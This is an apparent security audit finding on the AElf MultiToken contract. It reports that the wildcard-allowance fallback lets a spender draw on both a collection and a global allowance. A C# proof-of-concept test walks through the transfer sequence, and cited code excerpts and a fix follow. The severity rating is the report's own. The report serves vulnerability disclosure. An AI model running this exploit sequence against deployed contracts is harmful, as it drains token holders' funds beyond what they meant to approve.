# Audit Report

## Title
Wildcard Allowance Bypass via Hierarchical Fallback Allows Exceeding Approved Limits

## Summary
The `GetAllowance` method implements a hierarchical fallback mechanism for wildcard allowances but fails to consume insufficient intermediate allowances. This enables spenders to transfer the sum of all wildcard levels instead of the intended maximum, allowing direct token theft from users who approve multiple wildcard patterns.

## Finding Description

The vulnerability exists in the interaction between `DoTransferFrom` and the private `GetAllowance` method. [1](#0-0) 

When transferring NFTs, `DoTransferFrom` calls `GetAllowance` which returns both an allowance amount and an `allowanceSymbol` out parameter. The method then deducts the transferred amount from `State.Allowances[from][spender][allowanceSymbol]`.

The critical flaw occurs in `GetAllowance`'s hierarchical fallback logic: [2](#0-1) 

For NFT transfers, the method checks allowances hierarchically:
1. Specific symbol (e.g., "ABC-1")
2. Collection wildcard (e.g., "ABC-*") 
3. Global wildcard (e.g., "*")

When the collection wildcard is checked and found insufficient, the code continues to check the global wildcard. If the global wildcard is sufficient, it returns with `allowanceSymbol = "*"`, overwriting the previous value. This causes `DoTransferFrom` to deduct only from the global wildcard, leaving the collection wildcard completely untouched for later use.

**Design Intent Violation:**

The `GetAvailableAllowance` view method reveals the intended behavior: [3](#0-2) 

This method uses `Math.Max` to compute the maximum available allowance across all levels, proving that allowances should NOT be additive. Users should be able to transfer at most max(specific, collection, global), not their sum.

**Exploit Scenario:**

1. Owner approves Spender with "ABC-*" = 20 tokens
2. Owner approves Spender with "*" = 1000 tokens  
3. Expected maximum: max(20, 1000) = 1000 tokens
4. Spender executes 20 transfers of 50 tokens each (total 1000):
   - Each transfer: "ABC-*" (20) < 50, so fallback uses "*" wildcard
   - After 1000 tokens: "*" = 0, "ABC-*" = 20 (unchanged)
5. Spender transfers 20 more tokens:
   - Now "ABC-*" (20) >= 20, so uses "ABC-*" wildcard
   - "ABC-*" is consumed
6. Total transferred: 1020 tokens (20 excess over intended 1000)

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables direct token theft from any user who approves multiple wildcard levels:

- **Fund Loss**: Attackers can transfer more tokens than the approved maximum. The excess equals the sum of all insufficient intermediate wildcards.
- **Breaks Core Invariant**: Violates the allowance system's fundamental guarantee that approved amounts represent maximum transferable tokens.
- **Wide Scope**: Affects all NFT collections where users set both collection-specific ("PREFIX-*") and global ("*") wildcards.
- **No Special Authorization**: Exploitable using standard `Approve` and `TransferFrom` operations.

The system explicitly allows multiple wildcard patterns: [4](#0-3) 

This validation logic confirms users can legitimately set multiple wildcard levels, making this a realistic attack vector.

## Likelihood Explanation

**Likelihood: HIGH**

- **Reachable Entry Points**: Standard public methods via `Approve` and `TransferFrom` [5](#0-4) 
- **Feasible Preconditions**: Users legitimately set multiple wildcard levels for granular access control (e.g., global wildcard for trusted contracts, collection wildcard for specific marketplaces)
- **Low Attack Complexity**: Straightforward transaction sequence with no timing requirements or race conditions
- **Economic Rationality**: Attacker gains tokens at zero cost (except gas fees) with no risk
- **No Existing Protections**: The code has no checks to prevent consuming allowances additively

## Recommendation

Fix the `GetAllowance` method to either:

1. **Return early when collection wildcard exists (even if insufficient)**: Prevent fallback to global wildcard if a more specific pattern exists.

2. **Use Math.Max logic consistently**: Align the internal allowance consumption with the `GetAvailableAllowance` view method's logic - determine the maximum allowance across all levels and consume only from that one.

3. **Consume all checked allowances proportionally**: Track all allowances checked during the hierarchy and deduct from each proportionally, ensuring the total never exceeds the maximum.

The recommended fix is option 1 for simplicity - if a collection-specific wildcard exists, use it exclusively without falling back to the global wildcard, maintaining the hierarchical specificity principle.

## Proof of Concept

```csharp
[Fact]
public async Task WildcardAllowanceBypass_ExceedsApprovedLimits()
{
    // Setup: Create NFT collection and token
    await CreateNft(); // Creates "ABC-0" collection
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "ABC-1",
        Amount = 2000,
        To = DefaultAddress,
        Memo = "test"
    });
    
    // Owner approves spender with SMALL collection wildcard and LARGE global wildcard
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Amount = 20,           // Small amount
        Symbol = "ABC-*",      // Collection wildcard
        Spender = User1Address
    });
    
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Amount = 1000,         // Large amount
        Symbol = "*",          // Global wildcard
        Spender = User1Address
    });
    
    // Verify GetAvailableAllowance shows max(20, 1000) = 1000
    var availableAllowance = await TokenContractStub.GetAvailableAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "ABC-1"
    });
    availableAllowance.Allowance.ShouldBe(1000); // Expected maximum
    
    var user1Stub = GetTester<TokenContractImplContainer.TokenContractImplStub>(TokenContractAddress, User1KeyPair);
    
    // Exploit: Transfer 20 times * 50 tokens = 1000 tokens (uses global wildcard)
    for (int i = 0; i < 20; i++)
    {
        var result = await user1Stub.TransferFrom.SendAsync(new TransferFromInput
        {
            Amount = 50,
            From = DefaultAddress,
            Symbol = "ABC-1",
            To = User1Address,
            Memo = "exploit"
        });
        result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    }
    
    // Check: Global wildcard exhausted, collection wildcard still intact
    var globalAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "*"
    });
    globalAllowance.Allowance.ShouldBe(0);
    
    var collectionAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "ABC-*"
    });
    collectionAllowance.Allowance.ShouldBe(20); // Still untouched!
    
    // Exploit continues: Transfer 20 more tokens (uses collection wildcard)
    var finalTransfer = await user1Stub.TransferFrom.SendAsync(new TransferFromInput
    {
        Amount = 20,
        From = DefaultAddress,
        Symbol = "ABC-1",
        To = User1Address,
        Memo = "exploit"
    });
    finalTransfer.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify: Total transferred 1020 tokens, exceeding the intended max of 1000
    var balance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = User1Address,
        Symbol = "ABC-1"
    });
    balance.Balance.ShouldBe(1020); // Should be max 1000, but is 1020!
    
    // Both allowances now exhausted
    globalAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "*"
    });
    globalAllowance.Allowance.ShouldBe(0);
    
    collectionAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = DefaultAddress,
        Spender = User1Address,
        Symbol = "ABC-*"
    });
    collectionAllowance.Allowance.ShouldBe(0);
}
```

**Notes:**
- The vulnerability is confirmed by examining the actual code implementation
- The flaw specifically occurs when collection wildcard < transfer amount < global wildcard
- This breaks the allowance system's fundamental guarantee as evidenced by the `GetAvailableAllowance` using `Math.Max` logic
- The exploit requires no special privileges and uses only public methods

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L69-95)
```csharp
    private void DoTransferFrom(Address from, Address to, Address spender, string symbol, long amount, string memo)
    {
        AssertValidInputAddress(from);
        AssertValidInputAddress(to);
        
        // First check allowance.
        var allowance = GetAllowance(from, spender, symbol, amount, out var allowanceSymbol);
        if (allowance < amount)
        {
            if (IsInWhiteList(new IsInWhiteListInput { Symbol = symbol, Address = spender }).Value)
            {
                DoTransfer(from, to, symbol, amount, memo);
                DealWithExternalInfoDuringTransfer(new TransferFromInput()
                    { From = from, To = to, Symbol = symbol, Amount = amount, Memo = memo });
                return;
            }

            Assert(false,
                $"[TransferFrom]Insufficient allowance. Token: {symbol}; {allowance}/{amount}.\n" +
                $"From:{from}\tSpender:{spender}\tTo:{to}");
        }

        DoTransfer(from, to, symbol, amount, memo);
        DealWithExternalInfoDuringTransfer(new TransferFromInput()
            { From = from, To = to, Symbol = symbol, Amount = amount, Memo = memo });
        State.Allowances[from][spender][allowanceSymbol] = allowance.Sub(amount);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L97-116)
```csharp
    private long GetAllowance(Address from, Address spender, string sourceSymbol, long amount,
        out string allowanceSymbol)
    {
        allowanceSymbol = sourceSymbol;
        var allowance = State.Allowances[from][spender][sourceSymbol];
        if (allowance >= amount) return allowance;
        var tokenType = GetSymbolType(sourceSymbol);
        if (tokenType == SymbolType.Token)
        {
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }
        else
        {
            allowance = GetNftCollectionAllSymbolAllowance(from, spender, sourceSymbol, out allowanceSymbol);
            if (allowance >= amount) return allowance;
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }

        return allowance;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L64-87)
```csharp
    public override GetAllowanceOutput GetAvailableAllowance(GetAllowanceInput input)
    {
        var result = new GetAllowanceOutput
        {
            Symbol = input.Symbol,
            Owner = input.Owner,
            Spender = input.Spender,
        };
        var symbol = input.Symbol;
        var allowance = State.Allowances[input.Owner][input.Spender][symbol];
        if (CheckSymbolIdentifier(symbol))
        {
            result.Allowance = allowance;
            return result;
        }
        var symbolType = GetSymbolType(symbol);
        allowance = Math.Max(allowance, GetAllSymbolAllowance(input.Owner,input.Spender,out _));
        if (symbolType == SymbolType.Nft || symbolType == SymbolType.NftCollection)
        {
            allowance = Math.Max(allowance, GetNftCollectionAllSymbolAllowance(input.Owner, input.Spender, symbol, out _));
        }
        result.Allowance = allowance;
        return result;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L54-74)
```csharp
    private void AssertApproveToken(string symbol)
    {
        Assert(!string.IsNullOrEmpty(symbol), "Symbol can not be null.");
        var words = symbol.Split(TokenContractConstants.NFTSymbolSeparator);
        var symbolPrefix = words[0];
        var allSymbolIdentifier = GetAllSymbolIdentifier();
        Assert(symbolPrefix.Length > 0 && (IsValidCreateSymbol(symbolPrefix) || symbolPrefix.Equals(allSymbolIdentifier)), "Invalid symbol.");
        if (words.Length == 1)
        {
            if (!symbolPrefix.Equals(allSymbolIdentifier))
            {
                ValidTokenExists(symbolPrefix);
            }
            return;
        }
        Assert(words.Length == 2, "Invalid symbol length.");
        var itemId = words[1];
        Assert(itemId.Length > 0 && (IsValidItemId(itemId) || itemId.Equals(allSymbolIdentifier)), "Invalid NFT Symbol.");
        var nftSymbol = itemId.Equals(allSymbolIdentifier) ? GetCollectionSymbol(symbolPrefix) : symbol;
        ValidTokenExists(nftSymbol);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L254-268)
```csharp
    public override Empty TransferFrom(TransferFromInput input)
    {
        var tokenInfo = AssertValidToken(input.Symbol, input.Amount);
        DoTransferFrom(input.From, input.To, Context.Sender, tokenInfo.Symbol, input.Amount, input.Memo);
        return new Empty();
    }

    public override Empty Approve(ApproveInput input)
    {
        AssertValidInputAddress(input.Spender);
        var actualSymbol = GetActualTokenSymbol(input.Symbol);
        AssertValidApproveTokenAndAmount(actualSymbol, input.Amount);
        Approve(input.Spender, actualSymbol, input.Amount);
        return new Empty();
    }
```
